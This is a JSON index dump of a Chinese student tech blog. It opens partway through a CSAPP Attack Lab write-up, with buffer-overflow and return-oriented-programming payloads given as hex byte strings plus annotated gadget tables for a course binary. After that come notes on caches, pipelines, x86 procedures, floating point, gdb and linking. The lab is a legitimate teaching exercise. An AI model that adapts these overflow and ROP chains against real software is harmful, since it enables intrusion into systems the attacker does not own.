cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100;\t//这里随机分配可能导致的结果是把我们注入的字符串覆盖掉 sprintf(s, \u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } gdb调试（先跟第二层一样跳转到touch3）：\n先查看进入hexmatch之前的缓冲区，我们注入的代码还在（未使用的部分用3f填充）\n在进入了之后（我们发现有一部分已经被覆盖，但是没有威胁到我们的代码，所以这只是概率事件）：\n看起来28这里一直都是0,我们尝试把字符数组放在这里：\nman ascii //查看关于ascii的帮助 cookie\u0026mdash;\u0026gt;ascii\n0x14e6646f\u0026mdash;\u0026gt;31 34 65 36 36 34 36 66\n担心出错，再检查一遍：\n在更改的时候还要注意：不仅留心小端顺序，还要保证原来调用的函数的参数的值没有发生变化。\nQ：不知道为什么，28的位置写不进去，后面改成18的位置再重新写进去（记得更改rdi指向的地址，假如你错了的话）。\n返回导向编程（Return-oriented Programming） # phase4: # 在前面的情况下，我们都没有启用栈随机化和栈执行保护（在栈上执行代码本来就是一件很可疑的事情），那么就来了这种攻击方式。\n它要解决的还是上面的phase2和phase3的问题。\n这种攻击方式的思路就是说，我们不在栈上执行我们的代码，在它自己本身就有的代码里面挑挑拣拣来达到我们的目的，并且每次执行的指令后面都有c3这样就能不停的继续调用下去。\n汇编指令的相关字节码： # 这是它给我们的gadget表： # 0000000000401ab9 \u0026lt;start_farm\u0026gt;: 401ab9:\tb8 01 00 00 00 mov $0x1,%eax 401abe:\tc3 ret 0000000000401abf \u0026lt;addval_480\u0026gt;: 401abf:\t8d 87 6e a5 58 c3 lea -0x3ca75a92(%rdi),%eax ;2.3 58 c3 popq %rax (401ac3) ---1.1把rax设置成cookie的值 401ac5:\tc3 ret ; 就是这里，愚蠢的我一直把这里数错了导致几个小时没看出来为什么有segmentaion fault 0000000000401ac6 \u0026lt;getval_188\u0026gt;: 401ac6:\tb8 c8 89 c7 90 mov $0x90c789c8,%eax 401acb:\tc3 ret 0000000000401acc \u0026lt;addval_392\u0026gt;: 401acc:\t8d 87 58 91 c3 9e lea -0x613c6ea8(%rdi),%eax 401ad2:\tc3 ret 0000000000401ad3 \u0026lt;addval_406\u0026gt;: 401ad3:\t8d 87 ec ad d8 c3 lea -0x3c275214(%rdi),%eax 401ad9:\tc3 ret 0000000000401ada \u0026lt;getval_227\u0026gt;: 401ada:\tb8 65 48 89 c7 mov $0xc7894865,%eax ; 2.2 2.8 48 89 c7 movq %rax,%rdi(401adc) ---1.2把rdi设置成cookie值 401adf:\tc3 ret 0000000000401ae0 \u0026lt;getval_437\u0026gt;: 401ae0:\tb8 49 89 c7 90 mov $0x90c78949,%eax 401ae5:\tc3 ret 0000000000401ae6 \u0026lt;setval_348\u0026gt;: 401ae6:\tc7 07 48 89 c7 c3 movl $0xc3c78948,(%rdi) 401aec:\tc3 ret 0000000000401aed \u0026lt;setval_136\u0026gt;: 401aed:\tc7 07 58 90 90 90 movl $0x90909058,(%rdi) 401af3:\tc3 ret 0000000000401af4 \u0026lt;mid_farm\u0026gt;: 401af4:\tb8 01 00 00 00 mov $0x1,%eax 401af9:\tc3 ret 0000000000401afa \u0026lt;add_xy\u0026gt;: 401afa:\t48 8d 04 37 lea (%rdi,%rsi,1),%rax ; 2.7(401afa) 这里就是直接设计好的 401afe:\tc3 ret 0000000000401aff \u0026lt;getval_314\u0026gt;: 401aff:\tb8 a9 c9 d6 90 mov $0x90d6c9a9,%eax 401b04:\tc3 ret 0000000000401b05 \u0026lt;addval_442\u0026gt;: 401b05:\t8d 87 48 09 e0 90 lea -0x6f1ff6b8(%rdi),%eax 401b0b:\tc3 ret 0000000000401b0c \u0026lt;addval_139\u0026gt;: 401b0c:\t8d 87 89 ca 90 90 lea -0x6f6f3577(%rdi),%eax 401b12:\tc3 ret 0000000000401b13 \u0026lt;addval_491\u0026gt;: 401b13:\t8d 87 1f 4b 89 d6 lea -0x2976b4e1(%rdi),%eax ; 2.6(401b17) mov %edx,%esi 401b19:\tc3 ret 0000000000401b1a \u0026lt;setval_367\u0026gt;: 401b1a:\tc7 07 bb 48 89 e0 movl $0xe08948bb,(%rdi) ; 2.1(401b1d) mov %rsp,%rax 401b20:\tc3 ret 0000000000401b21 \u0026lt;getval_215\u0026gt;: 401b21:\tb8 48 89 e0 c1 mov $0xc1e08948,%eax 401b26:\tc3 ret 0000000000401b27 \u0026lt;setval_192\u0026gt;: 401b27:\tc7 07 89 c1 92 90 movl $0x9092c189,(%rdi) 401b2d:\tc3 ret 0000000000401b2e \u0026lt;getval_418\u0026gt;: 401b2e:\tb8 89 ca 84 c0 mov $0xc084ca89,%eax ;2.5(401b2f) mov %ecx,%edx test %al,%al 401b33:\tc3 ret 0000000000401b34 \u0026lt;addval_318\u0026gt;: 401b34:\t8d 87 8b d6 84 c0 lea -0x3f7b2975(%rdi),%eax 401b3a:\tc3 ret 0000000000401b3b \u0026lt;setval_167\u0026gt;: 401b3b:\tc7 07 48 89 e0 94 movl $0x94e08948,(%rdi) 401b41:\tc3 ret 0000000000401b42 \u0026lt;setval_410\u0026gt;: 401b42:\tc7 07 df 89 ca 91 movl $0x91ca89df,(%rdi) 401b48:\tc3 ret 0000000000401b49 \u0026lt;setval_408\u0026gt;: 401b49:\tc7 07 95 48 81 e0 movl $0xe0814895,(%rdi) 401b4f:\tc3 ret 0000000000401b50 \u0026lt;setval_115\u0026gt;: 401b50:\tc7 07 88 d6 90 c3 movl $0xc390d688,(%rdi) 401b56:\tc3 ret 0000000000401b57 \u0026lt;setval_336\u0026gt;: 401b57:\tc7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401b5d:\tc3 ret 0000000000401b5e \u0026lt;addval_315\u0026gt;: 401b5e:\t8d 87 89 c1 a4 c0 lea -0x3f5b3e77(%rdi),%eax 401b64:\tc3 ret 0000000000401b65 \u0026lt;setval_400\u0026gt;: 401b65:\tc7 07 89 ca 28 d2 movl $0xd228ca89,(%rdi) 401b6b:\tc3 ret 0000000000401b6c \u0026lt;getval_226\u0026gt;: 401b6c:\tb8 88 d6 38 c0 mov $0xc038d688,%eax 401b71:\tc3 ret 0000000000401b72 \u0026lt;getval_388\u0026gt;: 401b72:\tb8 c9 c1 20 c9 mov $0xc920c1c9,%eax ; (401b75) 401b77:\tc3 ret 0000000000401b78 \u0026lt;getval_379\u0026gt;: 401b78:\tb8 68 89 e0 c3 mov $0xc3e08968,%eax 401b7d:\tc3 ret 0000000000401b7e \u0026lt;getval_495\u0026gt;: 401b7e:\tb8 89 d6 92 c3 mov $0xc392d689,%eax 401b83:\tc3 ret 0000000000401b84 \u0026lt;addval_434\u0026gt;: 401b84:\t8d 87 89 ca 28 d2 lea -0x2dd73577(%rdi),%eax 401b8a:\tc3 ret 0000000000401b8b \u0026lt;getval_382\u0026gt;: 401b8b:\tb8 4c 89 e0 c3 mov $0xc3e0894c,%eax 401b90:\tc3 ret 0000000000401b91 \u0026lt;addval_100\u0026gt;: 401b91:\t8d 87 c9 c1 84 c9 lea -0x367b3e37(%rdi),%eax 401b97:\tc3 ret 0000000000401b98 \u0026lt;setval_140\u0026gt;: 401b98:\tc7 07 f8 8b c1 c3 movl $0xc3c18bf8,(%rdi) 401b9e:\tc3 ret 0000000000401b9f \u0026lt;setval_104\u0026gt;: 401b9f:\tc7 07 88 c1 84 c0 movl $0xc084c188,(%rdi) 401ba5:\tc3 ret 0000000000401ba6 \u0026lt;addval_125\u0026gt;: 401ba6:\t8d 87 89 d6 90 c3 lea -0x3c6f2977(%rdi),%eax 401bac:\tc3 ret 0000000000401bad \u0026lt;getval_111\u0026gt;: 401bad:\tb8 16 a9 09 ca mov $0xca09a916,%eax 401bb2:\tc3 ret 0000000000401bb3 \u0026lt;getval_256\u0026gt;: 401bb3:\tb8 a9 ca 20 db mov $0xdb20caa9,%eax 401bb8:\tc3 ret 0000000000401bb9 \u0026lt;getval_170\u0026gt;: 401bb9:\tb8 89 c1 08 d2 mov $0xd208c189,%eax 401bbe:\tc3 ret 0000000000401bbf \u0026lt;setval_102\u0026gt;: 401bbf:\tc7 07 0e 89 c1 c3 movl $0xc3c1890e,(%rdi) ; 2.4(401bc2) mov %eax,%ecx 401bc5:\tc3 ret 0000000000401bc6 \u0026lt;getval_364\u0026gt;: 401bc6:\tb8 81 d6 90 90 mov $0x9090d681,%eax 401bcb:\tc3 ret 0000000000401bcc \u0026lt;setval_159\u0026gt;: 401bcc:\tc7 07 89 ca c1 ce movl $0xcec1ca89,(%rdi) 401bd2:\tc3 ret 0000000000401bd3 \u0026lt;end_farm\u0026gt;: 401bd3:\tb8 01 00 00 00 mov $0x1,%eax 401bd8:\tc3 ret 那么我们输入的字节码如下：\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c3 1a 40 00 00 00 00 00 6f 64 e6 14 00 00 00 00 dc 1a 40 00 00 00 00 00 11 19 40 00 00 00 00 00 一定要把地址数清楚孩子们，因为有一个地址我没有数清楚而浪费了很长时间，不过解决段错误也是一种学习。（很难蚌的住啊）\nphase5: # 据说这是最难的一层，不过既然已经接触了汇编语言，那还是来试试看！\n解题思路来自于上面的Blog，在栈随机化的情况下，把rsp指针作为一个参考点来找到我们需要的参数。\n设计的asm：\nphase5.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0:\t48 89 e0 mov %rsp,%rax 3:\tc3 ret 4:\t48 89 c7 mov %rax,%rdi 7:\tc3 ret 8:\t58 pop %rax 9:\t90 nop a:\tc3 ret b:\t89 c1 mov %eax,%ecx d:\t90 nop e:\tc3 ret f:\t89 ca mov %ecx,%edx 11:\t84 c0 test %al,%al 13:\tc3 ret 14:\t89 d6 mov %edx,%esi 16:\t20 d2 and %dl,%dl 18:\tc3 ret 19:\t48 8d 04 37 lea (%rdi,%rsi,1),%rax 1d:\t48 89 c7 mov %rax,%rdi 20:\tc3 ret 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1d 1b 40 00 00 00 00 00 dc 1a 40 00 00 00 00 00 c3 1a 40 00 00 00 00 00 48 00 00 00 00 00 00 00 c2 1b 40 00 00 00 00 00 2f 1b 40 00 00 00 00 00 17 1b 40 00 00 00 00 00 fa 1a 40 00 00 00 00 00 dc 1a 40 00 00 00 00 00 22 1a 40 00 00 00 00 00 31 34 65 36 36 34 36 66 00 00 00 00 00 00 00 00 大功告成！！！抄别人写的就是简单啊（），如果说有难度，那其实在于你要写一串没有bug的汇编然后去找，但是看别人的就不难了（？）。\n","date":"20 March 2025","externalUrl":null,"permalink":"/tech/csappattacklab/","section":"Tech","summary":"","title":"CSAPP:AttackLab","type":"tech"},{"content":" 本期封面是动漫《白箱》的主角团，如果你对于动漫制作的幕后感兴趣，这是一部不可多得的佳作。\nComputer Organization # [!NOTE]\n在本篇之前，我已经实现了一个非常简单的CPU（感觉都是属于数字电路的内容，当然也是计组的一部分），课程笔记以及资源都来自于B站：Cs Primer。\n所以在这里只是简单记录一些感觉有必要的理论知识，还会不断补充。\nCache（存储器层次结构） # 1.DRAM SRAM SSD 机械硬盘读写以及存储，取内存和实际CPU之间的差异性。\n2.程序的局部性（Locality）:程序倾向于引用邻近于最近引用过的数据项或者是已经引用过的数据项本身（for遍历数组）\na.空间局部性 b.时间局部性\n引入：\n高速缓存存储器 # 1.结构 # SBE为总的大小。\n寻址原理：hash\n2.直接映射高速缓存（direct-mapped cache） # 就是每组只有一个行\n过程\na.组选择\n为什么把中间的位作为组索引而不是更高的位？\n如果高位做索引，那么很容易把一堆连续的块映射到一组高速缓存块里面，这样不符合空间局部性。\n中间的随机性相对更大一些。\nb.找到了组，进行行匹配\nc.根据块偏移位来寻找第一个字节的位置\nd.如果没有命中，从下一级内存中取相应的内存块并且直接做替换的操作\ne.实际过程：开始缓存为空，冷不命中，从L2中加载数据到L1,然后返回，接着假如标志位不相同，发生冲突不命中，进行替换操作。\nd.冲突不命中常见：thrash,高速缓存反复的加载和驱逐相同的一些组。\n3.组相联高速缓存(set associative cache) # 就是每个组包含多于一个的行\n和每个行进行一次匹配\nLFU和LRU策略\n4.全相联高速缓存（fully asscociative cache） # 就是只有一个组，里面有很多行\n没有组的选择，只有标记位和块偏移。\n单周期多周期处理器 # 一个时钟周期内完成一条指令\n多周期就是一条指令多个时钟周期\n流水线技术 # 五阶段流水线 # 把每个指令都填充成五个阶段，防止冲突\n流水线冒险 # 结构冒险：硬件资源产生冲突 # 数据冒险：逻辑上的数据依赖性产生冲突 # 控制冒险：跳转到别的指令，导致流水线之前准备的指令无效 # 解决：分支预测（动态）\n在X86系统上编写和运行程序 # 一个C程序处理流程 # 预处理-编译-汇编-链接-程序加载执行\n假设我们有文件main.c hello.c\ngcc main.c hello.c\t//这一条指令包含了上述的四个步骤 gcc -E hello.c -o hello.i //这表示对于文件进行预处理 -o是指定名称（擦除并且进行复制粘贴的流程） gcc -S hello.i -o hello.s\t//把预处理之后的文件处理成汇编代码 gcc -c hello.s -o hello.o\t//汇编成一个二进制文件，但是不进行链接的操作 工具：readelf（查看段的偏移） objdump（反汇编） hexdump（查看二进制文件的机器码）\ngcc main.o hello.o\t//直接将两个文件进行链接，如下是链接的过程 接着是程序加载执行的流程\n常见X86汇编指令 # 可以参照CSAPP熟悉基本语法，达到能读的要求即可\n[!TIP]\njmp类条件跳转指令之前可以跟其他许多指令\n比如 subl a,b 也可以看a和b之间满足的条件\n64位使用的寄存器 # 数据传送指令 # move：不能从内存直接到内存传送 # [!NOTE]\n我看过好几遍书，但是我感觉自己最难理解的地方就是函数的调用以及递归这里的东西，建议大家从push这里开始细细理解。\npush指令： # 1.把栈指针减去8,得到栈顶位置，此时栈顶还没有元素。2.把目的操作数放到栈顶。（push只要一个byte，栈上只是放了一堆data，和寄存器，和内存都没有关系）\n那么pop指令同理：1.把栈顶的值读入一个目标寄存器。2.把栈指针加8。\n条件控制 # if for while等语句都是条件跳转来实现的\nswitch语句当case范围较大时也是条件跳转，当范围较小是利用跳转表，一个连续数组的值域包含了所有的case情况(并且case的数量较多)\n*Process（过程） # 控制 + 传递 + 内存管理\n运行时栈（提前准备） # P去调用Q，首先存放返回地址，表明Q返回时从P的哪个位置开始执行，这个地址也是P栈帧的一部分。\n接着为Q分配一个栈帧，大多数的栈帧都是定长的，通过寄存器传递参数，如果大于6个，P在调用Q之前提前在自己的栈帧里存储好这些参数。\n转移控制（怎么交接控制权利） # call:把rip的值设置成callee的首地址，这样就把执行权利转换，接着把call指令下一条指令的地址压入栈中。\nret：把压入栈的地址弹出来，并且把rip的值设置成这个地址，这样就交还了控制权利。\n数据传送（怎么给Callee传递一些参数） # 在参数小于6个的情况下，我们直接用寄存器来传递，用rax来获得调用方法的返回值即可。\n在上图的Current frame中有一个Argument build area，这就是一个参数构造区，如果它也要调用一个参数多于6个的方法，那么就要提前在自己的栈帧里准备好，再执行call指令（注意：第七个参数会在栈的顶部）。\n栈上的局部存储（Callee中的局部变量是怎么实现的） # 比如局部变量太多，要取局部变量的一个地址，或者局部变量是数组及结构体等。\n还是上图，参数构造区之上就是我们减少栈指针分配给局部变量的空间。\n下例出自CSAPP\nlong swap_add (long *XP , long * yp) { long x = *xp ; long y = * yp ; *xp = y ; *yp = x ; return x + y ; } long caller () { //要处理以下两个局部变量，我就要为他们产生地址。 long argl = 534 ; long arg2 = 1057 ; long sum = swap_add (\u0026amp;argl , \u0026amp;arg2) ; long diff = argl - arg2 ; return sum * diff; } 以下是汇编代码\nlong caller() caller: subq $16 , %rsp movq $534 , (%rsp) movq $1057 , 8(%rsp) leaq 8(%rsp) , %rsi movq %rsp , %rdi call swap_add\t;这里的细节：方法虽然已经返回（返回之后之前压入的返回地址就会被弹出），但是栈帧还在，所以分配的局部变量还在 movq (%rsp) , %rdx subq 8(%rsp) ,%rdx imulq %rdx , %rax addq $16 , %rsp\t;此时栈帧不存在，会被后来的data覆盖掉 ret 栈帧分配到底拿来干嘛了？\n看下图：\n分配栈帧，先用来存放本方法要用的局部变量，接着是多于6个的参数从右至左依次压入栈中，然后call，注意，不要混淆局部变量和传递的参数，在被调用的方法中是不会用前一个方法栈帧中的局部变量的。\n寄存器中的局部存储空间 # 🔹 这些寄存器主要用于什么？ # 1. 存储局部变量 # （这也是一种存储局部变量的方法，比如在for循环中的index）\n如果一个函数有局部变量，但寄存器分配不足，编译器可能会把一些变量保存在被调用者保存寄存器里，避免频繁访问栈（比栈上的变量访问快）。\n2. 维持长期变量（Long-lived variables） # 如果某个变量在整个函数生命周期内都会被使用，而非临时数据，就可能放在 %rbx、%r12-%r15 这些寄存器里。\n3. 维护栈帧指针（%rbp） # 虽然现代编译器可能会省略栈帧指针（Frame Pointer Omission, FPO），但在调试模式下，%rbp 仍然用于保持当前函数的栈基址，帮助回溯调用栈。\n4. 传递跨函数调用的值 # 在一些情况下，如果一个值需要在多个函数调用之间保持不变，就可能存入被调用者保存寄存器，比如：\n递归函数中，某些参数可能需要跨多次递归调用保持不变。 在协程或上下文切换的代码里，某些寄存器可能存储特定的任务状态。 递归过程 # 到这里，理解递归过程就是简单的了，调用自己和调用任何一个过程都是类似的，每个函数都有自己的私有的栈帧。\n我们难理解的情况是栈帧里东西太复杂的情况。\n数组的分配和访问 # 1.指针访问，如果是地址，就用leaq加载有效地址，如果是取值就用mov指令即可。\n2.多维数组\n3.定长变长数组以及结构体\n关于缓冲区溢出问题 # C语言基础 # 关于位运算的技巧\n宏定义函数多行用\\分开，用do {\u0026hellip;\u0026hellip;} while(0)吃掉;（细节问题）\n内联函数：类似宏定义，调用的函数不跳转，直接展开，节约资源（根据编译器的情况而定)\nstatic inline int(...){......}\t//一般这样定义在头文件里使用 关于C语言不再赘述\n浮点数详解 # 浮点数存储形式 # （小数点浮动）进制转换（数字电路内容）\n[!NOTE]\nIEEE754典中典\n这里的尾数其实指的就是小数点之后的二进制表示：\n比如2.5 = 10.1b\n即 $$ 2.5 = 1.01*2^1 $$\n[!NOTE]\n这是一个规格化的浮点数，所谓规格化，我们默认一个浮点数是大于1的，即有一个隐含的前导1,我们只在尾数的23位中存储小数点的部分即可，但是如果指数部分为0,但是尾数不为0,这就是一个非规格化的浮点数，计算的规则已经发生了改变，此时的指数为1-bias，为了产生平滑的过渡。\n非规格化浮点数及舍入的问题 # 舍入：就近舍入，相同0优先\n指数部分越大，密度变小，精度就会变低\n浮点数的运算 # 先把指数设置相同，再相加这会导致大数吃掉小数的情况产生\n采用如下的累加算法\n比较问题：0.1 + 0.2 != 0.3（无限不循环小数相加导致的）\n[!NOTE]\n还有一个值得注意的点是转换类型时候的最近偶数舍入（银行家舍入），这有利于减少累积舍入的误差。\n课后作业 # 此时我们去做CSAPP的3个lab，并且把CSAPP2,3章的课后习题都解决一遍（我懒的写第二章了，我只写一下第三章的内容）\n1.datalab\n2.bomblab（gdb的使用，很有难度,我觉得可以先多看看书，做一下练习和课后习题，理解之后再去上手）\ngdb常用指令（来自https://arthals.ink/blog/bomb-lab作为参考的blog）\np $rax # 打印寄存器 rax 的值 p $rsp # 打印栈指针的值 p/x $rsp # 打印栈指针的值，以十六进制显示 p/d $rsp # 打印栈指针的值，以十进制显示 x/2x $rsp # 以十六进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2d $rsp # 以十进制格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/2c $rsp # 以字符格式查看栈指针 %rsp 指向的内存位置 M[%rsp] 开始的两个单位。 x/s $rsp # 把栈指针指向的内存位置 M[%rsp] 当作 C 风格字符串来查看。 x/b $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 1 字节。 x/h $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 2 字节（半字）。 x/w $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 4 字节（字）。 x/g $rsp # 检查栈指针指向的内存位置 M[%rsp] 开始的 8 字节（双字）。 info registers # 打印所有寄存器的值 info breakpoints # 打印所有断点的信息 delete breakpoints 1 # 删除第一个断点，可以简写为 d 1 3.attacklab（模拟攻击）\n[!NOTE]\n上述工作会花费很长时间，但是欲速则不达，如果难以下手，你可以参考CSDIY上的一些推荐博客。\n链接简单解读 # Static Linking # 可以理解是怎么把你写的多文件程序整合在一起运行。\n可重定位目标文件的分析(Relocatable File) # 单个文件汇编之后，后缀为.o的文件就是一个可重定位目标文件。\n（用以下的两个程序）\nreadelf -a main.o\t//分析elf文件内容 hexdump -C main.o\t//直接查看文件的二进制信息 符号表信息 # 弱符号和强符号 # 可执行文件 # 查看可执行文件的Program Header（可执行文件是怎么被加载执行的？）\nProgram Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align LOAD 0x001020 0x00800020 0x00800020 0x00198 0x00198 R E 0x1000 LOAD 0x002000 0x00801000 0x00801000 0x00038 0x00050 RW 0x1000 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 Section to Segment mapping: Segment Sections... 00 .text .rodata 01 .data .bss 02 静态链接的过程 # /* Simple linker script for os user-level programs. See the GNU ld \u0026#39;info\u0026#39; manual (\u0026#34;info ld\u0026#34;) to learn the syntax. */ //一个简单的linker脚本 OUTPUT_FORMAT(\u0026#34;elf32-i386\u0026#34;, \u0026#34;elf32-i386\u0026#34;, \u0026#34;elf32-i386\u0026#34;)\t//输出格式 OUTPUT_ARCH(i386)\t//架构类型 ENTRY(main)\t//程序的入口点（main函数） SECTIONS { /* Load programs at this address: \u0026#34;.\u0026#34; means the current address */ //在这个地址对程序进行加载 . = 0x800020; //以下都是把每个目标文件中的相同的段合并到新的段 .text : { *(.text .stub .text.* .gnu.linkonce.t.*) } PROVIDE(etext = .); /* Define the \u0026#39;etext\u0026#39; symbol to this value */ .rodata : { *(.rodata .rodata.* .gnu.linkonce.r.*) } /* Adjust the address for the data segment to the next page */ //转页进行存储，以上的页就可以设置成ro的一个页 . = ALIGN(0x1000); .data : { *(.data) } //记录下来，把.bss段设置成0 PROVIDE(edata = .); .bss : { *(.bss) } PROVIDE(end = .); /DISCARD/ : { *(.eh_frame .note.GNU-stack .comment) } } 重定位信息 # ","date":"10 March 2025","externalUrl":null,"permalink":"/tech/computerorgnization/","section":"Tech","summary":"","title":"ComputerOrgnization","type":"tech"},{"content":" \u0026ldquo;My Heart Is In The Work.\u0026rdquo; \u0026mdash;Andrew Carnegie\n","date":"8 March 2025","externalUrl":null,"permalink":"/tech/","section":"Tech","summary":"","title":"Tech","type":"tech"},{"content":"bomblab\n","externalUrl":null,"permalink":"/tech/csappbomblab/","section":"Tech","summary":"","title":"","type":"tech"},{"content":"MySQL\n","externalUrl":null,"permalink":"/tech/mysql/","section":"Tech","summary":"","title":"","type":"tech"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]